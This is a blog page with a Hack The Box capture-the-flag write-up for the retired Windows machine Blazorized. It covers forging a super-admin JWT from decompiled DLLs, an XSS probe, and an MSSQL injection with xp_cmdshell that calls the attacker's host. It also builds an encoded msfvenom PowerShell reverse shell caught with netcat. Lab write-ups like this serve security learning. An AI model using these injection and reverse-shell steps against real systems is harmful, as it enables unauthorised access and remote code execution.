<!DOCTYPE html>
<html lang="en">
<head>

    <title>HTB Write-up | Blazorized (user-only)</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <link rel="preload" as="style" href="../assets/built/screen.css%3Fv=e213fc6d24.css">
    <link rel="preload" as="script" href="../assets/built/source.js%3Fv=e213fc6d24">
    
    <link rel="preload" as="font" type="font/woff2" href="../assets/fonts/inter-roman.woff2%3Fv=e213fc6d24" crossorigin="anonymous">
<style>
    @font-face {
        font-family: "Inter";
        font-style: normal;
        font-weight: 100 900;
        font-display: optional;
        src: url(../assets/fonts/inter-roman.woff2%3Fv=e213fc6d24) format("woff2");
        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
    }
</style>

    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css%3Fv=e213fc6d24.css">

    <style>
        :root {
            --background-color: #ffffff
        }
    </style>

    <script>
        /* The script for calculating the color contrast has been taken from
        https://gomakethings.com/dynamically-changing-the-text-color-based-on-background-color-contrast-with-vanilla-js/ */
        var accentColor = getComputedStyle(document.documentElement).getPropertyValue('--background-color');
        accentColor = accentColor.trim().slice(1);

        if (accentColor.length === 3) {
            accentColor = accentColor[0] + accentColor[0] + accentColor[1] + accentColor[1] + accentColor[2] + accentColor[2];
        }

        var r = parseInt(accentColor.substr(0, 2), 16);
        var g = parseInt(accentColor.substr(2, 2), 16);
        var b = parseInt(accentColor.substr(4, 2), 16);
        var yiq = ((r * 299) + (g * 587) + (b * 114)) / 1000;
        var textColor = (yiq >= 128) ? 'dark' : 'light';

        document.documentElement.className = `has-${textColor}-text`;
    </script>

    <meta name="description" content="Write-up for Blazorized, a retired HTB Windows machine.">
    <link rel="canonical" href="index.html">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:type" content="article">
    <meta property="og:title" content="HTB Write-up | Blazorized (user-only)">
    <meta property="og:description" content="Write-up for Blazorized, a retired HTB Windows machine.">
    <meta property="og:url" content="inesmartins.github.io/htb-writeup-blazorized/">
    <meta property="og:image" content="inesmartins.github.io/content/images/size/w1200/2024/11/Screenshot-2024-11-13-at-13.35.48.png">
    <meta property="article:published_time" content="2024-11-13T13:30:46.000Z">
    <meta property="article:modified_time" content="2024-11-14T11:05:29.000Z">
    <meta property="article:tag" content="ctf">
    <meta property="article:tag" content="htb">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="HTB Write-up | Blazorized (user-only)">
    <meta name="twitter:description" content="Write-up for Blazorized, a retired HTB Windows machine.">
    <meta name="twitter:url" content="inesmartins.github.io/htb-writeup-blazorized/">
    <meta name="twitter:image" content="inesmartins.github.io/content/images/size/w1200/2024/11/Screenshot-2024-11-13-at-13.35.48.png">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Inês Martins">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="ctf, htb">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="381">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "",
        "url": "inesmartins.github.io/",
        "logo": {
            "@type": "ImageObject",
            "url": "inesmartins.github.io/favicon.ico",
            "width": 48,
            "height": 48
        }
    },
    "author": {
        "@type": "Person",
        "name": "Inês Martins",
        "url": "inesmartins.github.io/author/ines/",
        "sameAs": []
    },
    "headline": "HTB Write-up | Blazorized (user-only)",
    "url": "inesmartins.github.io/htb-writeup-blazorized/",
    "datePublished": "2024-11-13T13:30:46.000Z",
    "dateModified": "2024-11-14T11:05:29.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "inesmartins.github.io/content/images/size/w1200/2024/11/Screenshot-2024-11-13-at-13.35.48.png",
        "width": 1200,
        "height": 381
    },
    "keywords": "ctf, htb",
    "description": "Write-up for Blazorized, a retired HTB Windows machine.",
    "mainEntityOfPage": "inesmartins.github.io/htb-writeup-blazorized/"
}
    </script>

    <meta name="generator" content="Ghost 6.10">
    <link rel="alternate" type="application/rss+xml" title="" href="../rss/index.html">
    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.56/umd/portal.min.js" data-i18n="true" data-ghost="inesmartins.github.io/" data-key="592cb4e4fa1ab0f3f4adbed719" data-api="inesmartins.github.io/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
.gh-post-upgrade-cta {
    display: flex;
    flex-direction: column;
    align-items: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    text-align: center;
    width: 100%;
    color: #ffffff;
    font-size: 16px;
}

.gh-post-upgrade-cta-content {
    border-radius: 8px;
    padding: 40px 4vw;
}

.gh-post-upgrade-cta h2 {
    color: #ffffff;
    font-size: 28px;
    letter-spacing: -0.2px;
    margin: 0;
    padding: 0;
}

.gh-post-upgrade-cta p {
    margin: 20px 0 0;
    padding: 0;
}

.gh-post-upgrade-cta small {
    font-size: 16px;
    letter-spacing: -0.2px;
}

.gh-post-upgrade-cta a {
    color: #ffffff;
    cursor: pointer;
    font-weight: 500;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a:hover {
    color: #ffffff;
    opacity: 0.8;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a.gh-btn {
    display: block;
    background: #ffffff;
    text-decoration: none;
    margin: 28px 0 0;
    padding: 8px 18px;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 600;
}

.gh-post-upgrade-cta a.gh-btn:hover {
    opacity: 0.92;
}</style>
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="592cb4e4fa1ab0f3f4adbed719" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="inesmartins.github.io/" data-locale="en" crossorigin="anonymous"></script>
    
    <link href="inesmartins.github.io/webmentions/receive/" rel="webmention">
    <script defer src="../public/cards.min.js%3Fv=e213fc6d24"></script>
    <link rel="stylesheet" type="text/css" href="../public/cards.min.css%3Fv=e213fc6d24.css">
    <script defer src="../public/member-attribution.min.js%3Fv=e213fc6d24"></script><style>:root {--ghost-accent-color: #000000;}</style>
    <link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
<link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
<!-- Injects copyright and footer -->
<script>
    window.onload = function(e){ 
	    var copyrightElement = document.getElementsByClassName('copyright')[0];
    	copyrightElement.innerHTML = '<p>Inês Martins © 2024</p>'
        copyrightElement.innerHTML += '<p>Contact: <a href="mailto:inesmartins.github.io@pm.me">inesmartins.github.io@pm.me</a></p>'
	    copyrightElement.innerHTML += '<p>Banner by Josan Gonzalez aka <a href="https://www.artstation.com/josan">Death Burger</a>'
        var footerNav = document.getElementsByClassName('site-footer-nav')[0];
        footerNav.innerHTML = '<img src="http://www.hackthebox.eu/badge/image/172261" alt="Hack The Box">'
	}
</script>
<!-- Styles -->
<style>
    .gh-head-actions,
    .footer-cta, 
    .gh-head-button {
        display: none;
    }
    .article-image img {
        max-height: 400px;
        object-fit: contain;
    }
    .site-footer-nav {
        display: block;
    }
    @media (max-width: 800px) {    
	    .site-footer-nav {
    	    margin: 20px auto;
	    }
    }
</style>

</head>
<body class="post-template tag-ctf tag-htb tag-hash-import-2026-01-03-19-09 has-sans-title has-sans-body">

<div class="gh-viewport">
    
    <header id="gh-navigation" class="gh-navigation is-middle-logo gh-outer">
    <div class="gh-navigation-inner gh-inner">

        <div class="gh-navigation-brand">
            <a class="gh-navigation-logo is-title" href="../index.html">
                    
            </a>
            <button class="gh-burger gh-icon-button" aria-label="Menu">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 256 256"><path d="M224,128a8,8,0,0,1-8,8H40a8,8,0,0,1,0-16H216A8,8,0,0,1,224,128ZM40,72H216a8,8,0,0,0,0-16H40a8,8,0,0,0,0,16ZM216,184H40a8,8,0,0,0,0,16H216a8,8,0,0,0,0-16Z"></path></svg>                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 256 256"><path d="M205.66,194.34a8,8,0,0,1-11.32,11.32L128,139.31,61.66,205.66a8,8,0,0,1-11.32-11.32L116.69,128,50.34,61.66A8,8,0,0,1,61.66,50.34L128,116.69l66.34-66.35a8,8,0,0,1,11.32,11.32L139.31,128Z"></path></svg>            </button>
        </div>

        <nav class="gh-navigation-menu">
            <ul class="nav">
    <li class="nav-home"><a href="../index.html">Home</a></li>
    <li class="nav-about"><a href="../about-me/index.html">About</a></li>
</ul>

        </nav>

        <div class="gh-navigation-actions">
        </div>

    </div>
</header>

    

<main class="gh-main">

    <article class="gh-article post tag-ctf tag-htb tag-hash-import-2026-01-03-19-09">

        <header class="gh-article-header gh-canvas">

                <a class="gh-article-tag" href="../tag/ctf/index.html">ctf</a>
            <h1 class="gh-article-title is-title">HTB Write-up | Blazorized (user-only)</h1>
                <p class="gh-article-excerpt is-body">Write-up for Blazorized, a retired HTB Windows machine.</p>

            <div class="gh-article-meta">
                <div class="gh-article-author-image instapaper_ignore">
                            <a href="../author/ines/index.html"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg>
</a>
                </div>
                <div class="gh-article-meta-wrapper">
                    <h4 class="gh-article-author-name"><a href="../author/ines/index.html">Inês Martins</a></h4>
                    <div class="gh-article-meta-content">
                        <time class="gh-article-meta-date" datetime="2024-11-13">13 Nov 2024</time>
                            <span class="gh-article-meta-length"><span class="bull">—</span> 6 min read</span>
                    </div>
                </div>
            </div>

                <figure class="gh-article-image">
        <img
            srcset="../content/images/size/w320/2024/11/Screenshot-2024-11-13-at-13.35.48.png 320w,
                   ../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.48.png 600w,
                  ../content/images/size/w960/2024/11/Screenshot-2024-11-13-at-13.35.48.png 960w,
                 ../content/images/size/w1200/2024/11/Screenshot-2024-11-13-at-13.35.48.png 1200w,
                ../content/images/size/w2000/2024/11/Screenshot-2024-11-13-at-13.35.48.png.png 2000w"
            sizes="(max-width: 1200px) 100vw, 1120px"
            src="../content/images/size/w1200/2024/11/Screenshot-2024-11-13-at-13.35.48.png"
            alt="HTB Write-up | Blazorized (user-only)"
        >
    </figure>

        </header>

        <section class="gh-content gh-canvas is-body">
            <p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/Blazorized?ref=localhost">here</a>.</em></p><hr><h2 id="enumeration">Enumeration</h2><pre><code>~ nmap -F 10.10.11.22 -Pn

PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s</code></pre><p>Port <code>80</code> redirects to <a href="http://blazorized.htb/?ref=localhost">http://blazorized.htb/</a>, which means this virtual host needs to be mapped in order for us to be able to access the web application.</p><pre><code>~ sudo nano /etc/hosts

[...]
10.10.11.22 blazorized.htb</code></pre><p>The website is built using <a href="https://dotnet.microsoft.com/en-us/apps/aspnet/web-apps/blazor?ref=localhost">Blazor WebAssembly</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2024/08/Screenshot-2024-08-05-at-11.59.30.png" class="kg-image" alt loading="lazy" width="1439" height="714" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-05-at-11.59.30.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-11.59.30.png 1000w, ../content/images/2024/08/Screenshot-2024-08-05-at-11.59.30.png 1439w" sizes="(min-width: 1200px) 1200px"></figure><blockquote>Blazor is a feature of ASP.NET for building interactive web UIs using C# instead of JavaScript. It's real .NET running in the browser on <em>WebAssembly.</em></blockquote><p>It looks like we can temporarily "impersonate" the <code>super admin</code> user:</p><figure class="kg-card kg-image-card"><img src="../content/images/2024/08/Screenshot-2024-08-05-at-12.01.41.png" class="kg-image" alt loading="lazy" width="1152" height="466" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.01.41.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-12.01.41.png 1000w, ../content/images/2024/08/Screenshot-2024-08-05-at-12.01.41.png 1152w" sizes="(min-width: 720px) 720px"></figure><p>This button performs <code>GET</code> requests to <a href="http://api.blazorized.htb/posts?ref=localhost">http://api.blazorized.htb/posts</a> and <a href="http://api.blazorized.htb/categories?ref=localhost">http://api.blazorized.htb/categories</a> with an <code>authorization</code> header that contains a bearer token:</p><pre><code>authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzIyODU2MzAyLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9.J4bJYYN3EkV-PfFWJ90yAyOFS158LOanNLTduowSPHdYv28W7GQ59zeadaRaCZsyM_cfDH5r_tGXD0Mf43AUwA</code></pre><p>At this point, I'm not sure how this token is being generated because it doesn't seem to be retrieved from the API, and it's not hardcoded in any of the resource files, so there's probably some Blazor magic under the hood.</p><p>We can use <a href="https://github.com/hahwul/jwt-hack?ref=localhost">jwt-hack</a> to decode it:</p><pre><code>~ jwt-hack decode &lt;the-token&gt;

INFO[0000] Decoded data(claims)

header="{\"alg\":\"HS512\",\"typ\":\"JWT\"}" 
method="&amp;{HS512 SHA-512}"

INFO[0000] Expiraton Time
EXP=1722856302 TIME="1970-01-01 01:00:01.722856302 +0100 CET"

{
    "aud":"http://api.blazorized.htb",
    "exp":1722856302,
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role":[
       "Posts_Get_All",
       "Categories_Get_All"
    ],
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress":"superadmin@blazorized.htb",
    "iss":"http://api.blazorized.htb"
}</code></pre><p>We can see that this token was generated for a user with the <code>superadmin@blazorized.htb</code> email, and has the following "claims": <code>Posts_Get_All</code> and <code>Categories_Get_All</code>.</p><p>We can also see from the API responses that the posts' content is formatted in Markdown:</p><pre><code class="language-json">{
   "Posts":[
      {
         "ID":"1c391f9c-fd3e-4d86-b966-9a3e5d7e3d28",
         "Title":"Active Directory",
         "MarkdownContent":"Below are links to projects and posts relating AD red-teaming:\r\n\r\n- https://github.com/Group3r/Group3r\r\n- https://github.com/Leo4j/Amnesiac\r\n- https://github.com/JPG0mez/ADCSync\r\n- https://github.com/Processus-Thief/HEKATOMB\r\n- https://github.com/Mazars-Tech/AD_Miner\r\n- https://github.com/AlmondOffSec/PassTheCert\r\n- https://github.com/synacktiv/ntdissector\r\n- https://github.com/Hackndo/pyGPOAbuse\r\n- https://exploit.ph/external-trusts-are-evil.html\r\n- https://github.com/SecuraBV/Timeroast\r\n- https://github.com/SadProcessor/CypherDog\r\n- https://mayfly277.github.io/","CategoryID":"9a445790-f7e8-4351-8cf4-46fcae383eec"},
...
}</code></pre><p>This means that the front-end is somehow processing and displaying this Markdown, which may result in stored XSS if we're able to create or manipulate posts or categories:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2024/08/Screenshot-2024-08-05-at-12.28.14.png" class="kg-image" alt loading="lazy" width="1431" height="715" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.28.14.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-12.28.14.png 1000w, ../content/images/2024/08/Screenshot-2024-08-05-at-12.28.14.png 1431w" sizes="(min-width: 1200px) 1200px"></figure><p>This suspicion is further confirmed because the Markdown "playground" is vulnerable to DOM-based XSS:</p><pre><code class="language-html">&lt;img src=x onerror=alert(1) /&gt; </code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2024/08/Screenshot-2024-08-05-at-12.17.47.png" class="kg-image" alt loading="lazy" width="1123" height="496" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.17.47.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-12.17.47.png 1000w, ../content/images/2024/08/Screenshot-2024-08-05-at-12.17.47.png 1123w" sizes="(min-width: 720px) 720px"></figure><p>However, only the <code>GET</code> method seems to be allowed for <code>/posts</code> and <code>/categories</code>:</p><figure class="kg-card kg-image-card"><img src="../content/images/2024/08/Screenshot-2024-08-05-at-12.39.10.png" class="kg-image" alt loading="lazy" width="944" height="437" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.39.10.png 600w, ../content/images/2024/08/Screenshot-2024-08-05-at-12.39.10.png 944w" sizes="(min-width: 720px) 720px"></figure><p>When we try to request a non-existent post ID, we see that all of the application's DLLs and other source files are available under the <code>_framework</code> directory:</p><pre><code>http://blazorized.htb/post/1

http://blazorized.htb/_framework/blazor.boot.json
http://blazorized.htb/_framework/Blazored.LocalStorage.dll
http://blazorized.htb/_framework/Blazorized.DigitalGarden.dll
http://blazorized.htb/_framework/Blazorized.Shared.dll
...</code></pre><p>Let's download all of these files to a local dir ...</p><pre><code>~ wget -i requests.txt</code></pre><p>... so we can use the <a href="https://marketplace.visualstudio.com/items?itemName=icsharpcode.ilspy-vscode&ref=localhost">ilspy-vscode extension</a> to decompile the relevant source code.</p><p>It looks like the <code>Blazorized.Helpers</code> namespace has a <code>JWT</code> class that contains the logic for the temporary token generation, as well as a new interesting subdomain:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2024/08/Screenshot-2024-08-05-at-13.24.44.png" class="kg-image" alt loading="lazy" width="1441" height="710" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-05-at-13.24.44.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-13.24.44.png 1000w, ../content/images/2024/08/Screenshot-2024-08-05-at-13.24.44.png 1441w" sizes="(min-width: 1200px) 1200px"></figure><p>Note that this application is built with <a href="https://learn.microsoft.com/en-us/aspnet/core/blazor/hosting-models?view=aspnetcore-8.0&ref=localhost#blazor-server">Blazor Server</a>, instead of Blazor WebAssembly:</p><blockquote>With the Blazor Server hosting model, components are executed on the server from within an ASP.NET Core app. UI updates, event handling, and JavaScript calls are handled over a <a href="https://learn.microsoft.com/en-us/aspnet/core/signalr/introduction?view=aspnetcore-8.0&ref=localhost">SignalR</a> connection using the <a href="https://learn.microsoft.com/en-us/aspnet/core/fundamentals/websockets?view=aspnetcore-8.0&ref=localhost">WebSockets protocol</a>. <em>[...]</em></blockquote><p>It's unlikely, but possible, that the JWT we have is a valid form of authorization for this subdomain. </p><p>We can see that there are 2 different "audiences" in the source code: <code>apiAudience</code> and <code>adminDashboardAudience</code>.</p><p>We can guess that the <code>temporary</code> token we've previously come across is generated using the following function:</p><pre><code>public static string GenerateTemporaryJWT(long expirationDurationInSeconds = 60L)
{
    try
    {
        List&lt;Claim&gt; claims = new List&lt;Claim&gt;
        {
            new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", superAdminEmailClaimValue),
            new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", postsPermissionsClaimValue),
            new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", categoriesPermissionsClaimValue)
        };
        SigningCredentials signingCredentials = GetSigningCredentials();
        DateTime? expires = DateTime.UtcNow.AddSeconds(expirationDurationInSeconds);
        JwtSecurityToken token = new JwtSecurityToken(issuer, apiAudience, claims, null, expires, signingCredentials);
        return new JwtSecurityTokenHandler().WriteToken(token);
    }
    catch (Exception)
    {
        throw;
    }
}
</code></pre><p>But there is another function, which generates a token for the same email address but for the <code>adminDashboardAudience</code>, and with the <code>superAdminRoleClaimValue</code> claim:</p><pre><code>using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using Microsoft.IdentityModel.Tokens;

public static string GenerateSuperAdminJWT(long expirationDurationInSeconds = 60L)
{
    try
    {
        List&lt;Claim&gt; claims = new List&lt;Claim&gt;
        {
            new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", superAdminEmailClaimValue),
            new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", superAdminRoleClaimValue)
        };
        SigningCredentials signingCredentials = GetSigningCredentials();
        DateTime? expires = DateTime.UtcNow.AddSeconds(expirationDurationInSeconds);
        JwtSecurityToken token = new JwtSecurityToken(issuer, adminDashboardAudience, claims, null, expires, signingCredentials);
        return new JwtSecurityTokenHandler().WriteToken(token);
    }
    catch (Exception)
    {
        throw;
    }
}
</code></pre><p>Let's create a new .NET project, import the relevant DLLs, and try to generate a valid token (we increased the expiration to 600000 seconds, to make testing easier):</p><figure class="kg-card kg-code-card"><pre><code class="language-C#">using Blazorized.Helpers;

namespace BlazorJWTMock
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Generating super admin token ...");
            Console.WriteLine(JWT.GenerateSuperAdminJWT(600000));
            Console.WriteLine("Done!");
        }
    }
}</code></pre><figcaption>BlazorJWTMock/Program.cs</figcaption></figure><figure class="kg-card kg-code-card"><pre><code>&lt;Project Sdk="Microsoft.NET.Sdk"&gt;
  &lt;PropertyGroup&gt;
    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
    &lt;TargetFramework&gt;net7.0&lt;/TargetFramework&gt;
    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;
    &lt;Nullable&gt;enable&lt;/Nullable&gt;
  &lt;/PropertyGroup&gt;
  &lt;ItemGroup&gt;
    &lt;Reference Include="&lt;PATH-TO-LIBS&gt;/Blazored.LocalStorage.dll" /&gt;
    &lt;Reference Include="&lt;PATH-TO-LIBS&gt;/Blazorized.DigitalGarden.dll" /&gt;
    &lt;Reference Include="&lt;PATH-TO-LIBS&gt;/Blazorized.Helpers.dll" /&gt;
    &lt;Reference Include="&lt;PATH-TO-LIBS&gt;/Microsoft.IdentityModel.Tokens.dll" /&gt;
    &lt;Reference Include="&lt;PATH-TO-LIBS&gt;/Microsoft.IdentityModel.JsonWebTokens.dll" /&gt;
    &lt;Reference Include="&lt;PATH-TO-LIBS&gt;/System.IdentityModel.Tokens.Jwt.dll" /&gt;
  &lt;/ItemGroup&gt;
&lt;/Project&gt;</code></pre><figcaption>BlazorJWTMock/BlazorJWTMock.csproj</figcaption></figure><pre><code>~ dotnet run --project BlazorJwtMock/BlazorJwtMock.csproj

Generating admin token ...

eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiU3VwZXJfQWRtaW4iLCJleHAiOjE3MjI4NzgyNzUsImlzcyI6Imh0dHA6Ly9hcGkuYmxhem9yaXplZC5odGIiLCJhdWQiOiJodHRwOi8vYWRtaW4uYmxhem9yaXplZC5odGIifQ.XUlzWUdD04FGiWCOP_SbsULNGCDVNRmvmSlAAEi2SCJNmUNf9irKVmtvyReIl0tqN8WwcvkrqWxAOO3RMXZONw

Done!</code></pre><p>Ok, we have a token, but we're not sure how to use it to authenticate in the <code>admin</code> subdomain.</p><p>Even after reversing every DLL that looked relevant, I couldn't find the logic that was responsible for getting or setting this token, so I decided to fuzz this parameter, as recommended in the forum:</p><figure class="kg-card kg-image-card"><img src="../content/images/2024/08/Screenshot-2024-08-06-at-10.46.49.png" class="kg-image" alt loading="lazy" width="783" height="438" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-06-at-10.46.49.png 600w, ../content/images/2024/08/Screenshot-2024-08-06-at-10.46.49.png 783w" sizes="(min-width: 720px) 720px"></figure><p>The solution was to add this JWT to the <code>jwt</code> LocalStorage value:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2024/08/Screenshot-2024-08-06-at-10.37.36.png" class="kg-image" alt loading="lazy" width="1633" height="652" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-06-at-10.37.36.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-06-at-10.37.36.png 1000w, ../content/images/size/w1600/2024/08/Screenshot-2024-08-06-at-10.37.36.png 1600w, ../content/images/2024/08/Screenshot-2024-08-06-at-10.37.36.png 1633w" sizes="(min-width: 1200px) 1200px"></figure><hr><h2 id="from-admin-to-foothold">From Admin to Foothold</h2><p>We have an obvious clue from the <code>/home</code> page:</p><blockquote>To avoid latency issues, this super admin panel does not consume the API but speaks to the database directly.</blockquote><p>We can see that the "Check Duplicate" features are vulnerable to SQLi, and we know from the initial <code>nmap</code> scan that we're dealing with a MSSQL database, so let's try to get a request from the victim machine using a stacked query and the <code>EXEC master.dbo.xp_cmdshell</code> command, e.g.:</p><pre><code>';EXEC master.dbo.xp_cmdshell 'curl http://10.10.14.91:8000';--</code></pre><pre><code>~ python3 -m http.server 8000
::ffff:10.10.11.22 - - [06/Aug/2024 11:58:11] "GET / HTTP/1.1" 200 -</code></pre><p>Alright, let's try to trigger a reverse shell:</p><pre><code>~ msfvenom -p cmd/windows/reverse_powershell LHOST={local_ip} LPORT={local_port} &gt; revshell.txt

# after cleaning up the revshell.txt file and removing "powershell -w hidden -nop -c"

~ iconv -f ASCII -t UTF-16LE revshell.txt | base64 | tr -d '\n'
JABhAD0AJwAxADAALgAxADAALgAxADQALgA5ADEAJwA7ACQAYgA9ADQANAA0ADQAOwAkAGMAPQBOA...

~ powershell.exe -EncodedCommand JABhAD0AJwAxADAALgAxADAALgAxADQALgA5ADEAJwA7ACQAYgA9ADQANAA0ADQAOwAkAGMAPQBOA...</code></pre><p>and we get a shell!</p><pre><code>~ nc -l 4444
Microsoft Windows [Version 10.0.17763.5936]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; whoami
blazorized\nu_1055

C:\Windows\system32&gt; cd Users
C:\Users&gt; dir
02/25/2024  03:41 PM    &lt;DIR&gt;          NU_1055
...

C:\Users&gt;type C:\Users\NU_1055\Desktop\user.txt</code></pre><p>We didn't even have to pivot to get the user flag! :)</p>
        </section>

    </article>


</main>


            <section class="gh-container is-grid gh-outer">
                <div class="gh-container-inner gh-inner">
                    <h2 class="gh-container-title">Read more</h2>
                    <div class="gh-feed">
                            <article class="gh-card post">
    <a class="gh-card-link" href="../htb-write-up-horizontall/index.html">
            <figure class="gh-card-image">
                <img
                    srcset="../content/images/size/w160/format/webp/2025/01/Horizontall-1.png 160w,
                           ../content/images/size/w320/format/webp/2025/01/Horizontall-1.png 320w,
                          ../content/images/size/w600/format/webp/2025/01/Horizontall-1.png 600w,
                         ../content/images/size/w960/format/webp/2025/01/Horizontall-1.png 960w,
                        ../content/images/size/w1200/format/webp/2025/01/Horizontall-1.png.png 1200w,
                       ../content/images/size/w2000/format/webp/2025/01/Horizontall-1.png1.png 2000w"
                    sizes="320px"
                    src="../content/images/size/w600/2025/01/Horizontall-1.png"
                    alt="HTB Write-up | Horizontall (user-only)"
                    loading="lazy"
                >
            </figure>
        <div class="gh-card-wrapper">
            <h3 class="gh-card-title is-title">HTB Write-up | Horizontall (user-only)</h3>
                <p class="gh-card-excerpt is-body">Write-up for Horizontall, a retired HTB Linux machine.</p>
            <footer class="gh-card-meta">
<!--
             -->
                    <span class="gh-card-author">By Inês Martins</span>
                    <time class="gh-card-date" datetime="2025-01-03">03 Jan 2025</time>
                <!--
         --></footer>
        </div>
    </a>
</article>
                            <article class="gh-card post">
    <a class="gh-card-link" href="../automate-threat-modeling-with-pytm-and-github-actions/index.html">
            <figure class="gh-card-image">
                <img
                    srcset="../content/images/size/w160/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 160w,
                           ../content/images/size/w320/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 320w,
                          ../content/images/size/w600/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 600w,
                         ../content/images/size/w960/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 960w,
                        ../content/images/size/w1200/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png.png 1200w,
                       ../content/images/size/w2000/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png1.png 2000w"
                    sizes="320px"
                    src="../content/images/size/w600/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png"
